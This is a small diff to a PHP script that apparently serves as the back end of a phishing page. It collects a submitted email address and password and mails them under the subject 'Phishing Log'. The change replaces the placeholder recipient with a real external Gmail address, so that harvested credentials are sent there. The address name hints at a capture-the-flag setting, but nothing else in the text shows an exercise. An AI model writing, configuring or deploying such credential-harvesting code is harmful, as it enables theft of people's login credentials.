@@ -6,7 +6,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $data = "Email: $email | Password: $password\n";
     
     // Send email (Replace with your email)
-    $to = "your-email@example.com";  
+    $to = "tareqkh.ctf@gmail.com";  
     $subject = "Phishing Log";
     $headers = "From: noreply@example.com";
     
